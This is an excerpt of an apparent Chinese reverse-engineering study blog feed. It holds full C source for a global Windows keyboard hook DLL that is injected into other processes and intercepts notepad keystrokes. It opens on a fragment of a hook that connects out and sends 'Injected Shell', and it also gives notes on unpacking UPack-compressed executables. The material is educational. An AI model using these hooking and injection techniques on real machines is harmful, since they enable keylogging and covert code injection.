class="built_in">puts</span>(<span class="string">&quot;connect error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(CallNextHookEx(<span class="literal">NULL</span>, code, wParam, lParam));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Connected&quot;</span>);</span><br><span class="line"></span><br><span class="line">    message = <span class="string">&quot;Injected Shell&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( send(s, message, <span class="built_in">strlen</span>(message), <span class="number">0</span>) &lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Send failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(CallNextHookEx(<span class="literal">NULL</span>, code, wParam, lParam));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Data sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(CallNextHookEx(<span class="literal">NULL</span>, code, wParam, lParam));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.6--Windows Hook</title>
      <link href="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/"/>
      <url>/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/</url>
      
        <content type="html"><![CDATA[<h4 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h4><p>Windows消息钩取并利用小实例进行理解该过程</p><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h5><p>关键下钩子的API的原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK <span class="title function_">SetWindowsHookExW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>       idHook,</span></span><br><span class="line"><span class="params">  [in] HOOKPROC  lpfn,</span></span><br><span class="line"><span class="params">  [in] HINSTANCE hmod,</span></span><br><span class="line"><span class="params">  [in] DWORD     dwThreadId<span class="comment">//该参数值为0时则该钩子为全局钩子会对所有实例以及后续新生实例产生作用</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>示例程序源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HookMain.exe源码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;conio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DEF_DLL_NAME<span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DEF_HOOKSTART<span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DEF_HOOKSTOP<span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HMODULEhDll = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTARTHookStart = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTOPHookStop = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KeyHook.dll载入</span></span><br><span class="line">hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary(%s) failed!!! [%d]&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// export函数导入</span></span><br><span class="line">HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用Hook</span></span><br><span class="line">HookStart();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直至接收到&#x27;q&#x27;否则不停止钩取</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;press &#x27;q&#x27; to quit!\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>( _getch() != <span class="string">&#x27;q&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 钩子断钩</span></span><br><span class="line">HookStop();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KeyHook.dll 卸载</span></span><br><span class="line">FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HookMain的源码比较简单，就是载入KeyHook.dll并且导入HookStart和HookStop用于控制钩子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//KeyHook.dll源码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME<span class="string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>( dwReason )</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"><span class="type">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line"><span class="keyword">if</span>( !(lParam &amp; <span class="number">0x80000000</span>) )<span class="comment">//释放键盘</span></span><br><span class="line">&#123;</span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);<span class="comment">//获取模块的绝对路径，为null则获取正在执行的程序路径</span></span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//比对当前进程的名称，若为notepad.exe则消息不回传递给应用程序或下一个钩子</span></span><br><span class="line"><span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若非notepad.exe则调用CallNextHookEx将消息传递给应用程序或下一个钩子</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( g_hHook )</span><br><span class="line">&#123;</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>KeyHook.dll则是控制钩子和钩子的内部逻辑，回调函数KeyboardProc是自写的逻辑完成的功能是在接受全局钩子钩取到的消息时判断该消息所对应的应用程序是否是notepad.exe，若为notepad.exe则return 1 否则CallNextHookEx。下钩HookStart 断钩HookStop。</p><hr><h5 id="梳理一下过程："><a href="#梳理一下过程：" class="headerlink" title="梳理一下过程："></a>梳理一下过程：</h5><ul><li><p>Hookmain.exe调用LoadLibrary尝试载入KeyHook.dll文件，成功则LoadLibrary返回KeyHook.dll的对应句柄</p></li><li><p>成功载入KeyHook.dll由于Windows载入DLL的机制会使得KeyHook.DllMain因为dwReason &#x3D; DLL_PROCESS_ATTACH触发，执行相应的行为（g_hInstance &#x3D; hinstDLL：实际上hinstDLL是指向KeyHook.dll自身的实例句柄）</p></li><li><p>HookMain.exe接着获取了KeyHook.dll下的两个API ：HookStart &amp; HookStop，并启动了HookStart</p></li><li><p>程序回到KeyHook.dll内部，执行SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); 含义是：钩子处理的消息类型是WH_KEYBOARD，一下是SetWindowsHookEx.idHook的可取值int类型（代号标识），比较多这里只列出源码中的WH_KEYBOARD，更多信息请自行查阅文档</p><table><thead><tr><th>Value</th><th>Meanning</th></tr></thead><tbody><tr><td><strong>WH_KEYBOARD</strong>2</td><td>Installs a hook procedure that monitors keystroke messages. For more information, see the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)">KeyboardProc</a> hook procedure.</td></tr></tbody></table><p>  表明钩子SetWindowsHookEx处理的是键盘事件，回调函数是KeyHook.KeyboardProc这是由于（g_hInstance指向KeyHook.dll的实例句柄），最后一个参数0表明钩子是个全局钩子。</p></li><li><p>当钩子的触发事件（键盘事件）发生，会调用KeyHook.KeyboardProc，该函数的原型：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ <span class="type">int</span>    code,<span class="comment">//how to process the message</span></span></span><br><span class="line"><span class="params">  _In_ WPARAM wParam,<span class="comment">//contain information about a keystroke message</span></span></span><br><span class="line"><span class="params">  _In_ LPARAM lParam<span class="comment">//contain information about a keystroke message</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>  第一个参数code：</p><blockquote><p>A code the hook procedure uses to determine how to process the message. If <em>code</em> is less than zero, the hook procedure must pass the message to the <a href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a> function without further processing and should return the value returned by <strong>CallNextHookEx</strong>. This parameter can be one of the following values.</p><p>表明钩子相应处理过程如何处理钩取到的消息，当该值小于0，则不对钩取到的内容做更多处理，必须让KeyboardProc()函数返回CallNextHookEx()</p></blockquote><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>HC_ACTION</strong> 0</td><td align="left">The <em>wParam</em> and <em>lParam</em> parameters contain information about a keystroke message.</td></tr><tr><td align="left"><strong>HC_NOREMOVE</strong> 3</td><td align="left">The <em>wParam</em> and <em>lParam</em> parameters contain information about a keystroke message, and the keystroke message has not been removed from the message queue. (An application called the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-peekmessagea"><strong>PeekMessage</strong></a> function, specifying the <strong>PM_NOREMOVE</strong> flag.)</td></tr></tbody></table><p>  钩子回调函数KeyboardProc判断消息来源是否是关心的进（线）程，不是则放行，是则做截取（截取后可以进行相应的修改操作影响最终输入的内容，比如往记事本中写入内容，截取后将其修改成其他内容）由于不是本节的主题内容，这里截取后并未做更多的处理。</p></li></ul><hr><h5 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h5><p>程序运行在终端会提示关键字符串<code>press &#39;q&#39; to quit!</code> 给了快速定位main函数的方式：</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/1.png" class=""><p>在0x00401006处调用LoadLibarayA() 载入KeyHook.dll 文件并且在0x0040103D处获取KeyHook.dll.HookStart()的地址在之后也载入了KeyHook.dll.HookStop()函数：</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/2.png" class=""><p>并且在不远处的代码0x0040104B的<code>call ebx</code> 对KeyHook.dll.HookStart() 进行调用，这里跟随：</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/3.png" class=""><p>由地址空间的变化可以确定此时所在的空间是KeyHook.dll的空间</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/4.png" class=""><p>前面的几个push操作是对SetWindowsHookExW参数的入栈，这是下钩的函数。</p><p>之后retn回程序用户地址空间，并且完成终端输出：<code>press &#39;q&#39; to quit!</code></p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/5.png" class=""><p>并且后续出现了一个条件判断循环，不难判断出这是对键盘输入 ‘ q ’的循环判断，0x71对应的ascii码也是 ‘ q ’</p><hr><p>接下来保持&#x3D;&#x3D;HookMain.exe(管理员权限)&#x3D;&#x3D;的运行（这是为了保持钩子处于开启的状态），然后OD附加notepad.exe进行调试观察。</p><p>运行notepad.exe，随后使用OD进行进程附加，附加成功后打开debugging Options打开载入‘终端与新模块DLL’选项，这样当有新模块载入时会中断程序运行</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/6.png" class=""><p>预期的效果是在notepad.exe中使用键盘，然后触发钩子，注入KeyHook.dll然后OD会中断notepad.exe的运行。</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/7.png" class=""><p>双击KeyHook.dll条目，跳转到KeyHook.dll的入口：</p><img src="/2022/05/02/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/8.png" class=""><p>（ps：成功载入KeyHook.dll后需要取消OD中 DebuggingOptions 中的新模块加入中断的选项，已经载入了就不需要了，以保证不出错）</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.5--Upack压缩过后的OEP</title>
      <link href="/2022/05/01/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-5-Upack%E5%8E%8B%E7%BC%A9%E8%BF%87%E5%90%8E%E7%9A%84OEP/"/>
      <url>/2022/05/01/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-5-Upack%E5%8E%8B%E7%BC%A9%E8%BF%87%E5%90%8E%E7%9A%84OEP/</url>
      
        <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>本节内容关注利用OllyDbg调试UPack压缩过的文件，并初步体验UPack的解压缩过程。</p><p>首先了解两个概念：EP &amp; OEP</p><blockquote><p>EP是EntryPoint简称，就是入口点。<br>如果程序加壳后，程序会有个入口点，就是EntryPoint。但加壳前的程序入口点就称为OEP（Original EntryPoint）</p><p>因此本节的目的在于找到UPack加壳前的程序，即OEP</p></blockquote><p>依照惯例附上PE格式结构图</p><img src="/2022/05/01/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-5-Upack%E5%8E%8B%E7%BC%A9%E8%BF%87%E5%90%8E%E7%9A%84OEP/PE.png" class=""><hr><h5 id="Part-1：设置OD的EP"><a href="#Part-1：设置OD的EP" class="headerlink" title="Part .1：设置OD的EP"></a>Part .1：设置OD的EP</h5><p>先前有文章分析过UPack对PE文件的修改，接着进行分析</p><p>并且第一个节区的VirtualSize是未压缩前notepad.exe的 ImageSize 并且UPack的压缩过后的notepad.exe的数据存放在第二个节区中，此外UPack解压缩需要的代码以及数据存放在UPack对PE格式中一些不必要字段的利用以及在符合规范下进行扩充的部分&#x3D;&#x3D;（IMAGE_OPTIONAL_HEADER大小由0xE0 -&gt; 0x148即OptionalHeader正常结束的位置到SectionHeader的空间 以及 OptionalHeader.DataDirectory节省下来的空间 以及每个节区的 SectionHeader中不必要字段）&#x3D;&#x3D;</p><p><strong>OllyDbg载入</strong></p><p>载入过程出现如下的提示</p><p>这是由于Upack在压缩时改变了PE格式，而Ollydby在载入文件时会校验PE格式是否正确（Upack畸形的并未通过，因此提示）</p><p>这时需要手动完成EP的设置，需要载入的ImageBase以及EntryPoint的RVA</p><p>使用工具查看：</p><p>出于学习目的还是回顾下上次的《UPack分析》文章手工找出这两个字段并验证。</p><p>这两个字段都是OptionalHeader中的字段，根据《UPack分析》知道OptionalHeader起始偏移0x28，结合文首PE结构图AddressOfEntruPoint 、 ImageBase 字段在OptionalHeader中的相对偏移找出这两个字段：</p><p>AddressOfEntruPoint  &#x3D; 0x00001018  ImageBase  &#x3D; 0x01000000，结果与工具分析出的一致。</p><p>知道了这两个值，程序EP应该是 0x01001018，在OllyDbg进行设置(有些三方修改过的OD已经可以识别就省略这一步)</p><hr><h5 id="Part-2：解码循环"><a href="#Part-2：解码循环" class="headerlink" title="Part .2：解码循环"></a>Part .2：解码循环</h5><blockquote><p>所有压缩器中都存在解码循环（DecodeLoop），循环读取加密的内容进行解码然后进行写回操作恢复，先前分析知道UPack会把压缩的数据放在第二个节区，在运行解码循环将这些数据解压缩后放到第一个节区。</p></blockquote><p>因此在调试的过程中需要留意数据传输的指令所操作的地址所在的区段是否与第二个节区、第一节区相关：</p><p>从EP开始调试，0x01001018</p><p>运行到光标处时前面两行指令完成的是从0x010011B0处读取DWORD（4byte）的内容到EAX，此时可见EAX的值是：0x0100739D（《逆向工程核心原理》提到这个值是OEP，猜测是经验积累的结果），如果事先知道0x0100739D就是OEP则直接设置断点让debug自己运行即可得到解压后的代码了。出于学习目的，该方案不做考虑，探究UPack的解压缩一些过程。</p><p>书中提到UPack的Decode()是在0x0101FD18处，会被反复调用进行压缩单元的解压</p><p>查看esi的值 &#x3D; 0x0102718C，由于是DS段，故在数据窗口跟踪这个地址，找到对应的值是 <strong>&#x3D;&#x3D;0x0101FCCB（Decode函数入口）&#x3D;&#x3D;</strong></p><p>也就是实际上<code> call dword ptr ds:[esi]</code>  调用的是0x0101FCCB处的函数，跟进去看看：</p><p>decode()会将第二节区的压缩的内容进行循环解压写回到第一节区，因此decode对应的指令需要着重关注同时设置了edi esi寄存器的mov指令的部分，因为这通常意味着数据的传输（并不是第一次执行，因为实在调试中截的图）</p><p>可以看到重复从ds : [esi] (第一节区)往es : [edi]写入数据，写入长度看ecx &#x3D; 0x110，观察此次写入操作的数据窗口内容变化</p><p>经过调试观察得到<code>rep movs byte ptr es:[edi] , byte ptr ds:[esi]</code>完成的是清空ds:[edi]的0x110空间的内容。真正实现解码内容传递的是在decode()中的这条指令：（在最开始这个指令并不是一样，运行过后会变动，位置时第二节区）</p><p>出于好奇进行观察，跟踪地址0x0101FE5D的数据变化，结果发现如下的指令改变了这个地址的内容（把第三节区的内容复制到第二节区），使得指令发生变化：</p><p>发现从地址0x010270F0起始的0x27个DWORD内容传送至0x010FE28起始往后0x27个DWORD空间</p><p>接着调试分析发现下面这个指令是解压数据的产生位置，会</p><p>接下来就是这行指令完成解压数据的写回，观察写入地址，发现地址是属于第一节区的部分</p><p>使用OD打开未经UPack处理的原版程序发现写入的位置相同的部分数据相同，观察数据窗口的变化以及指令的执行情况，发现从0x0100136B开始往后写解码数据</p><p>目前调试以及写回的解码部分（选中）</p><p>未被UPack处理的原始数据中对应的部分</p><p>结束解码写回即是退出解码循环：</p><p>查看ds:[esi+0x34]地址中存放的4字节值 &#x3D; 0x01014B5A， 即当edi的值 &#x3D; 0x01014B5A解码结束。</p><p>在跳出循环指令下一条处设置断点运行程序，跳出解码循环：</p><p>观察解码数据写入情况：</p><p>UPack版本：</p><p>原始版本：</p><p>数据完全一致，说明UPack的解码部分完全还原原始代码。</p><p>14B5A - 136B &#x3D; 137EF，相比ImageSize少了一部分，应该是在解码的时候写入了其他位置，因为在开启写入136B位置之前，写入指令的地址指向是第一节区的其他位置。</p><hr><h5 id="Part-3：设置IAT"><a href="#Part-3：设置IAT" class="headerlink" title="Part .3：设置IAT"></a>Part .3：设置IAT</h5><blockquote><p>一般而言，压缩器执行完解码循环后会根据源文件重新组织IAT。这就是凭经验判断OEP的方法，UPack也有类似的过程。</p></blockquote><p>《逆向工程核心原理》书中是根据DLL名以及导入的函数来确定压缩器重新组织IAT的指令群的，同样，在结束解码循环后在OD中顺着指令执行流程一路F8也看得到这个代码：</p><p>之后碰到retn指令观察到栈顶元素，即文首开始提到的OEP了</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.4--UPack分析</title>
      <link href="/2022/04/29/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.4--UPack%E5%88%86%E6%9E%90/"/>
      <url>/2022/04/29/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.4--UPack%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p><strong>运行时压缩器：</strong>这类压缩器是针对可执行文件而言的，<strong>经处理后的可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩程序对压缩部分进行代码还原</strong>。本节将要对经Upack压缩后的可执行文件进行PE格式的分析，以达到更好的理解PE文件头以及Upack压缩的巧妙之处（未违背PE格式）。</p><hr><h5 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h5><blockquote><p><strong>Upack修改的部分：</strong></p><h6 id="DOS-HEADER-e-lfanew"><a href="#DOS-HEADER-e-lfanew" class="headerlink" title="DOS_HEADER.e_lfanew"></a>DOS_HEADER.e_lfanew</h6><h6 id="IMAGE-NT-HEADERS-FileHeader"><a href="#IMAGE-NT-HEADERS-FileHeader" class="headerlink" title="_IMAGE_NT_HEADERS.FileHeader"></a>_IMAGE_NT_HEADERS.FileHeader</h6><p>（相关字段WORD <strong>SizeOfOptionalHeader</strong>，该字段指示PE头另一个结构体成员OptionalHeader的大小，Upack增加了该值，由于在设计PE格式之初为了使用不同大小的OptionalHeader增加了该字段，通常PE32文件格式其大小确定为E0，而64位的PE32+则设置为F0，Upack增加该值的目的为了延后节区表的起始，欺骗PE装载器达到扩容的目的，扩容的空间用于在IMAGE_OPTIONAL_HEADER和第一个IMAGE_SECTION_HEADER之间增加空间供写入解压代码需要。）</p><h6 id="IMAGE-NT-HEADERS-OptionalHeader"><a href="#IMAGE-NT-HEADERS-OptionalHeader" class="headerlink" title="IMAGE_NT_HEADERS.OptionalHeader"></a>IMAGE_NT_HEADERS.OptionalHeader</h6><p>（相关字段DWORD <strong>NumberOfRvaAndSizes</strong>，该字段用于指示OptionalHeader最后一个成员数组DataDirectory的成员个数，正常是16个，值0x10，Upack修改为0x0A，相对减少，使得余下的几个DataDirectory元素的空间可用于写入解压代码）</p><h6 id="IMAGE-SECTION-HEADER中字段"><a href="#IMAGE-SECTION-HEADER中字段" class="headerlink" title="IMAGE_SECTION_HEADER中字段"></a>IMAGE_SECTION_HEADER中字段</h6><p>该结构体内的一些字段对于运行并不是必要的。这些字段如下：（DWORD PointerToRelocations ； DWORD PointerToLinenumbers ； WORD NumberOfRelocations ； WORD NumberOfLinenumbers）</p><h6 id="节区重叠。"><a href="#节区重叠。" class="headerlink" title="节区重叠。"></a>节区重叠。</h6><h6 id="RVA2RAW"><a href="#RVA2RAW" class="headerlink" title="RVA2RAW"></a>RVA2RAW</h6><h6 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h6></blockquote><p>ps：概览列出的独到这里有个印象即可，后面详细阐述</p><hr><h5 id="DOS-HEADER相关"><a href="#DOS-HEADER相关" class="headerlink" title="DOS_HEADER相关"></a>DOS_HEADER相关</h5><p>upack压缩前的DOS_HEADER用于指示PE头的关键字段e_lfnew值由0xE0变为0x10。正常的部分e_lfnew由文件DOS_HEADER加上可选的DOS存根部分在之后才是IMAGE_NT_HEADERS的起始。</p><p><strong>UPack此举的目的在于重叠DOS_HEADER和IMAGE_NT_HEADER</strong></p><p>之所以可以进行该操作是由于DOS_HEADER的关键字段只有两个，其余的字段覆盖也不会对运行造成影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 